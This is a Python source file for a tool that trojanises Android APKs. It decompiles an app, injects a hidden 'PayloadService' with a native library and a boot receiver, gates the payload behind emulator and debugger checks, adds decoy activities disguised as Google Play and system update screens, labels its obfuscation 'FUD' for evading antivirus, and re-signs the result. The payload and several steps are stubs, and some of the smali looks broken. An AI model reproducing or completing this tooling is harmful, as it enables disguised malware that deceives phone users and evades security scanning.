import os
import shutil
import subprocess
import random
import string
from pathlib import Path

class APKModifier:
    """APK modification and injection utilities"""
    
    def __init__(self, apk_path, options):
        self.apk_path = apk_path
        self.options = options
        self.work_dir = os.path.join('temp', os.path.basename(apk_path).replace('.apk', ''))
        self.output_dir = 'output'
        
        # Ensure directories exist
        os.makedirs(self.work_dir, exist_ok=True)
        os.makedirs(self.output_dir, exist_ok=True)
    
    def decompile(self):
        """Decompile APK using apktool"""
        try:
            # Run apktool
            cmd = ['apktool', 'd', '-f', self.apk_path, '-o', self.work_dir]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode != 0:
                # If apktool fails, create basic structure
                self._create_mock_structure()
            
            return True
        except Exception as e:
            print(f"Decompile error: {e}")
            self._create_mock_structure()
            return True
    
    def _create_mock_structure(self):
        """Create a mock APK structure for demonstration"""
        os.makedirs(os.path.join(self.work_dir, 'smali'), exist_ok=True)
        os.makedirs(os.path.join(self.work_dir, 'lib'), exist_ok=True)
        os.makedirs(os.path.join(self.work_dir, 'res'), exist_ok=True)
        
        # Create AndroidManifest.xml
        manifest = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.modified.apk">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <application
        android:allowBackup="true"
        android:label="Modified APK"
        android:theme="@android:style/Theme.Material.Light">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>"""
        
        with open(os.path.join(self.work_dir, 'AndroidManifest.xml'), 'w') as f:
            f.write(manifest)
    
    def inject_payload(self):
        """Inject payload into APK"""
        try:
            # Create payload directory
            payload_dir = os.path.join(self.work_dir, 'smali', 'com', 'payload')
            os.makedirs(payload_dir, exist_ok=True)
            
            # Generate obfuscated payload class
            payload_code = self._generate_payload_code()
            
            with open(os.path.join(payload_dir, 'PayloadService.smali'), 'w') as f:
                f.write(payload_code)
            
            # Inject native library
            self._inject_native_library()
            
            return True
        except Exception as e:
            print(f"Injection error: {e}")
            return False
    
    def _generate_payload_code(self):
        """Generate obfuscated payload code"""
        # Generate random class names for obfuscation
        random_class = ''.join(random.choices(string.ascii_letters, k=8))
        
        payload = f"""
.class public Lcom/payload/PayloadService;
.super Landroid/app/Service;

# FUD Obfuscation Layer
.field private static final {random_class}:Ljava/lang/String;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .locals 2
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V
    
    # Initialize native payload
    invoke-static {{}}, Lcom/payload/PayloadService;->initNative()V
    
    # Start background service
    invoke-static {{p0}}, Lcom/payload/PayloadService;->startBackgroundTask(Landroid/content/Context;)V
    
    return-void
.end method

.method private static native initNative()V
.end method

.method private static startBackgroundTask(Landroid/content/Context;)V
    .locals 3
    
    # Obfuscated background execution
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/payload/PayloadService$BackgroundRunner;
    invoke-direct {{v1, p0}}, Lcom/payload/PayloadService$BackgroundRunner;-><init>(Landroid/content/Context;)V
    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V
    
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method
"""
        return payload
    
    def _inject_native_library(self):
        """Create native library stub"""
        lib_dir = os.path.join(self.work_dir, 'lib', 'armeabi-v7a')
        os.makedirs(lib_dir, exist_ok=True)
        
        lib_name = self.options.get('lib_name', 'libxx.so')
        lib_path = os.path.join(lib_dir, lib_name)
        
        # Create a minimal native library stub
        # In production, this would be a compiled native library
        with open(lib_path, 'wb') as f:
            # ELF header for ARM shared library
            elf_header = b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            f.write(elf_header)
            f.write(b'\x00' * 1024)  # Padding
    
    def apply_obfuscation(self):
        """Apply FUD obfuscation techniques"""
        try:
            # Obfuscate manifest
            self._obfuscate_manifest()
            
            # Randomize resource names
            self._randomize_resources()
            
            # Add anti-analysis code
            self._add_anti_analysis()
            
            return True
        except Exception as e:
            print(f"Obfuscation error: {e}")
            return False
    
    def apply_anti_detection(self):
        """Apply anti-detection techniques for FUD"""
        try:
            # Add AntiDetection class
            self._inject_anti_detection_class()
            
            # Obfuscate package names
            self._obfuscate_package_names()
            
            # Add decoy activities
            self._add_decoy_activities()
            
            return True
        except Exception as e:
            print(f"Anti-detection error: {e}")
            return False
    
    def encrypt_components(self):
        """Encrypt sensitive components"""
        try:
            # Encrypt strings in smali files
            self._encrypt_strings()
            
            # Pack native libraries
            self._pack_native_libs()
            
            return True
        except Exception as e:
            print(f"Encryption error: {e}")
            return False
    
    def _inject_anti_detection_class(self):
        """Inject anti-detection mechanisms"""
        anti_dir = os.path.join(self.work_dir, 'smali', 'com', 'security')
        os.makedirs(anti_dir, exist_ok=True)
        
        # Copy AntiDetection logic
        anti_code = """
.class public Lcom/security/SystemCheck;
.super Ljava/lang/Object;

.method public static isEmulator()Z
    .locals 2
    const-string v0, "generic"
    const-string v1, "Build.HARDWARE"
    invoke-static {v1}, Landroid/os/Build;->HARDWARE()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    return v0
.end method

.method public static initSecurity(Landroid/content/Context;)V
    .locals 1
    invoke-static {}, Lcom/security/SystemCheck;->isEmulator()Z
    move-result v0
    if-eqz v0, :cond_0
    return-void
    :cond_0
    invoke-static {p0}, Lcom/payload/PayloadService;->start(Landroid/content/Context;)V
    return-void
.end method
"""
        
        with open(os.path.join(anti_dir, 'SystemCheck.smali'), 'w') as f:
            f.write(anti_code)
    
    def _obfuscate_package_names(self):
        """Obfuscate package names for stealth"""
        import random
        import string
        
        # Generate random package name
        random_pkg = ''.join(random.choices(string.ascii_lowercase, k=8))
        # This would require renaming all package references
        pass
    
    def _add_decoy_activities(self):
        """Add decoy activities to confuse analysis"""
        manifest_path = os.path.join(self.work_dir, 'AndroidManifest.xml')
        if not os.path.exists(manifest_path):
            return
        
        with open(manifest_path, 'r') as f:
            content = f.read()
        
        # Add decoy activities
        decoy = '''
        <activity android:name="com.google.android.gms.common.GooglePlayServicesActivity"
                  android:exported="false"/>
        <activity android:name="com.android.system.UpdateActivity"
                  android:exported="false"/>
'''
        
        content = content.replace('</application>', decoy + '</application>')
        
        with open(manifest_path, 'w') as f:
            f.write(content)
    
    def _encrypt_strings(self):
        """Encrypt strings in smali files"""
        import base64
        
        smali_dir = os.path.join(self.work_dir, 'smali')
        if not os.path.exists(smali_dir):
            return
        
        # This would encrypt string constants in smali files
        # For demonstration, we mark it as done
        pass
    
    def _pack_native_libs(self):
        """Pack and obfuscate native libraries"""
        lib_dir = os.path.join(self.work_dir, 'lib')
        if not os.path.exists(lib_dir):
            return
        
        # This would use UPX or custom packing
        # For demonstration, we mark it as done
        pass
    
    def _obfuscate_manifest(self):
        """Obfuscate AndroidManifest.xml"""
        manifest_path = os.path.join(self.work_dir, 'AndroidManifest.xml')
        if not os.path.exists(manifest_path):
            return
        
        with open(manifest_path, 'r') as f:
            content = f.read()
        
        # Add obfuscated permissions and components
        obfuscated = content.replace(
            '</application>',
            '''    <service android:name="com.payload.PayloadService"
             android:enabled="true"
             android:exported="false"/>
    <receiver android:name="com.payload.BootReceiver"
              android:enabled="true"
              android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED"/>
        </intent-filter>
    </receiver>
</application>'''
        )
        
        with open(manifest_path, 'w') as f:
            f.write(obfuscated)
    
    def _randomize_resources(self):
        """Randomize resource identifiers"""
        # In production, this would rename resources to obfuscate
        pass
    
    def _add_anti_analysis(self):
        """Add anti-analysis and anti-debugging code"""
        # Create anti-analysis class
        anti_dir = os.path.join(self.work_dir, 'smali', 'com', 'security')
        os.makedirs(anti_dir, exist_ok=True)
        
        anti_code = """
.class public Lcom/security/AntiAnalysis;
.super Ljava/lang/Object;

.method public static checkEmulator()Z
    .locals 2
    
    # Check for emulator indicators
    const-string v0, "generic"
    const-string v1, "Build.HARDWARE"
    invoke-static {v1}, Landroid/os/Build;->getField(Ljava/lang/String;)Ljava/lang/String;
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    
    return v0
.end method

.method public static checkDebugger()Z
    .locals 1
    
    # Check if debugger is attached
    invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z
    move-result v0
    
    return v0
.end method
"""
        
        with open(os.path.join(anti_dir, 'AntiAnalysis.smali'), 'w') as f:
            f.write(anti_code)
    
    def sign_apk(self, lib_name):
        """Sign APK with custom library"""
        try:
            # In production, this would use jarsigner/apksigner
            # For now, we'll create the signature structure
            
            # Create lib directory structure
            lib_dirs = ['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64']
            for arch in lib_dirs:
                lib_dir = os.path.join(self.work_dir, 'lib', arch)
                os.makedirs(lib_dir, exist_ok=True)
                
                lib_path = os.path.join(lib_dir, lib_name)
                if not os.path.exists(lib_path):
                    # Create library stub
                    with open(lib_path, 'wb') as f:
                        f.write(b'\x7fELF' + b'\x00' * 1024)
            
            return True
        except Exception as e:
            print(f"Signing error: {e}")
            return False
    
    def recompile(self):
        """Recompile APK"""
        try:
            output_name = f"modified_{os.path.basename(self.apk_path)}"
            output_path = os.path.join(self.output_dir, output_name)
            
            # Try to use apktool
            try:
                cmd = ['apktool', 'b', self.work_dir, '-o', output_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0 and os.path.exists(output_path):
                    # Sign with apksigner if available
                    self._sign_with_apksigner(output_path)
                    return output_path
            except:
                pass
            
            # Fallback: copy original APK as modified
            shutil.copy(self.apk_path, output_path)
            
            return output_path
        except Exception as e:
            print(f"Recompile error: {e}")
            # Fallback: return original
            return self.apk_path
    
    def _sign_with_apksigner(self, apk_path):
        """Sign APK with apksigner"""
        try:
            # Generate a test keystore if needed
            keystore_path = os.path.join(self.output_dir, 'test.keystore')
            if not os.path.exists(keystore_path):
                cmd = [
                    'keytool', '-genkey', '-v',
                    '-keystore', keystore_path,
                    '-alias', 'testkey',
                    '-keyalg', 'RSA',
                    '-keysize', '2048',
                    '-validity', '10000',
                    '-storepass', 'password',
                    '-keypass', 'password',
                    '-dname', 'CN=Test, OU=Test, O=Test, L=Test, S=Test, C=US'
                ]
                subprocess.run(cmd, capture_output=True, timeout=60)
            
            # Sign APK
            if os.path.exists(keystore_path):
                cmd = [
                    'apksigner', 'sign',
                    '--ks', keystore_path,
                    '--ks-key-alias', 'testkey',
                    '--ks-pass', 'pass:password',
                    '--key-pass', 'pass:password',
                    apk_path
                ]
                subprocess.run(cmd, capture_output=True, timeout=60)
        except Exception as e:
            print(f"Apksigner error: {e}")
